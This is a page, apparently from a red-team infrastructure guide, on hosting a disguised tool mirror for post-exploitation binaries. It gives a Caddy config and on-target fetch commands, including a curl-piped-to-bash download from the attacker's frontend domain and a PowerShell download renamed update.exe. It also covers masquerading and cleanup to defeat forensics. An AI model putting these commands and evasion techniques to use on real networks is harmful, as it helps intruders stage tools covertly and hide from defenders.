# Tool mirrors

Downloading tools from GitHub during an operation leaves a record. An outbound HTTPS request to
`raw.githubusercontent.com/impacket/impacket/...` at the moment exploitation begins is a timing correlation
that a defender can use to anchor the operation to a host, a session, and a clock. The request carries the
tool name in the URL. The target's proxy logs keep it.

A self-hosted mirror behind the redirector chain serves the same binaries from a hostname that looks like
something else. The implant or the attack server fetches from the mirror; the mirror is fronted like any other
backend; the request from the target's network reaches a domain categorised as, say, a software update
endpoint, not a security research repository.

## What to mirror

The toolset varies by operation, but a working baseline:

* Compiled implants and stagers, generated fresh per operation from the [C2 backend](c2s.md).
* Privilege escalation binaries: precompiled exploits for the target's kernel or service versions.
* Post-exploitation tooling: [Impacket](https://github.com/fortra/impacket), BloodHound ingestors,
  Rubeus, SharpHound.
* Living-off-the-land helpers: legitimate signed binaries useful for lateral movement that the target's
  estate may not have installed.

Precompile everything on the attack server before the operation starts. A mirror that serves source code and
compiles on demand on the target is noisier and slower than one that serves ready binaries.

## Hosting pattern

A simple HTTPS file server behind the [frontend nginx](../frontend/nginx.md) is enough. Caddy is convenient
because it handles TLS automatically and serves a directory tree with one config line:

```
<frontend-domain> {
    root * /opt/mirrors/<operation>
    file_server browse
    basicauth /* {
        op <bcrypt-hash>
    }
}
```

Basic auth over TLS keeps the mirror from serving to anyone who happens across the URL. The credential is
shared via the C2 channel or hardcoded into a fetch script dropped on the target by the implant.

## Fetch pattern on the target

A one-line fetch from a compromised host, using tooling already present:

```powershell
# PowerShell
(New-Object Net.WebClient).DownloadFile(
    "https://<frontend-domain>/tools/SharpHound.exe",
    "$env:TEMP\update.exe"
)
```

```bash
# curl on Linux
curl -su op:<password> https://<frontend-domain>/tools/linpeas.sh | bash
```

The URL path and filename are part of the [masquerading](../frontend/masquerading.md) decision. `/tools/`
is a placeholder; a path like `/cdn/assets/v2/` or `/updates/agent/` fits the cover site's supposed purpose
better.

## Cleanup

Delete the mirror's content directory at the end of the operation. The binaries sitting on the backend host
after teardown are a forensic gift if the host is seized before destruction. If the backend uses a
[Packer-built image](../automation/packer.md) and the mirror content is written at runtime rather than baked
in, teardown is as simple as stopping the container.
